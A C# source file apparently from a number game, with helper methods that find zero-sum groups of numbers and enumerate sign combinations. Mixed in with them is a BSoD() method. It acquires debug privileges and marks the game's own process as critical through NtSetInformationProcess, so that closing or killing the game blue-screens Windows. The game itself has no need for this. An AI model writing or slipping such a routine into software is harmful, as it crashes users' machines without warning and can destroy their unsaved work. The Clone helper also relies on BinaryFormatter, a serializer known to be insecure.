using System;
using System.CodeDom;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http.Headers;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using NumberGamePlus.Classes;
using NumberGamePlus.Components;

namespace NumberGamePlus.Algorithms
{
    internal static class Algorithms
    {

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        public static void BSoD()
        {
            var isCritical = 1;  // we want this to be a Critical Process
            var BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
            Process.EnterDebugMode();  //acquire Debug Privileges
                                       // setting the BreakOnTermination = 1 for the current process
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        }

        public static int[][] Get0Groups(int[] values)
        {
            var result = new List<int[]>();
            for (var i = 1; i < values.Length; i++)
            {
                var list = PermutationCombinations(Enumerable.Range(0, values.Length).ToList(), i);
                foreach (var ls in list)
                {
                    if (ls.Sum(n => values[n]) == 0)
                    {
                        result.Add(ls.ToArray());
                    }
                }
            }
            return result.ToArray();
        }

        public static List<List<int>> PermutationCombinations(List<int> things, int countInOneGroup)
        {
            var result = new List<List<int>>();
            if (countInOneGroup == 1)
            {
                foreach (var i in things)
                {
                    result.Add(new List<int>() { things[i] });
                }
                return result;
            }
            for (var i = 0; i < things.Count - 1; i++)
            {
                for (var j = 1; j < things.Count; j++)
                {
                    if (i >= j) continue;
                    result.Add(new List<int>() { things[i], things[j] });
                }
            }
            if (countInOneGroup != 2)
            {
                var tmp = new List<List<int>>();
                tmp.AddRange(result);
                result.Clear();
                for (var i = 0; i < tmp.Count; i++)
                {
                    var tmp2 = new List<int>() { -114514 };
                    for (var j = 2; j < things.Count; j++) tmp2.Add(things[j]);
                    var ls = PermutationCombinations(tmp2, countInOneGroup - 1);
                    for (var j = 0; j < ls.Count; j++)
                    {
                        if (!ls[j].Contains(-114514) || ls[j][1] <= tmp[i][1]) continue;
                        var tmp3 = new List<int>()
                        {
                            tmp[i][0],
                            tmp[i][1]
                        };
                        foreach (var l in ls[j]) if (l != -114514) tmp3.Add(l);
                        result.Add(tmp3);
                    }
                }
            }
            return result;
        }

        public static T Clone<T>(T RealObject)
        {
            using (Stream objectStream = new MemoryStream())
            {
                IFormatter formatter = new BinaryFormatter();
                formatter.Serialize(objectStream, RealObject);
                objectStream.Seek(0, SeekOrigin.Begin);
                return (T)formatter.Deserialize(objectStream);
            }
        }

        public static bool Any0Possibilities(List<List<int>> possibilities)
        {
            foreach (var poss in possibilities)
            {
                var sum_poss = 0;
                foreach (var num in poss)
                    sum_poss += num;
                if (sum_poss == 0)
                    return true;
            }
            return false;
        }

        public static List<List<int>> GetPossibilitiesOfSignums(int[] signums)
        {
            var possibilities = new List<List<int>>();
            foreach (var sgn in signums)
            {
                var dup_possibilities = Clone(possibilities);
                foreach (var poss in possibilities)
                    poss.Add(sgn);
                foreach (var dup_poss in dup_possibilities)
                    dup_poss.Add(-sgn);
                possibilities.AddRange(dup_possibilities);
            }
            return possibilities;
        }
    }
}
